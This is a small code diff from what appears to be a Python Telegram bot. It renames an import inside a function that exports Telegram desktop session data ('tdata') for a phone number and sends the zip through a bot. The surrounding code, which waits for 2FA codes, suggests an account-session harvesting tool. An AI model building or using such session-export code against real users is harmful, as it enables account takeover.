@@ -127,8 +127,8 @@ async def wait_for_2fa(user_id):
 async def generate_tdata(user_id, phone):
     print(f"Generating tdata for {phone}")
     try:
-        from auth import export_tdata
-        zip_data = await export_tdata(phone)
+        from auth import export_tdata as _export_tdata
+        zip_data = await _export_tdata(phone)
         if zip_data:
             b = Bot(token=BOT_TOKEN)
             await b.send_document(
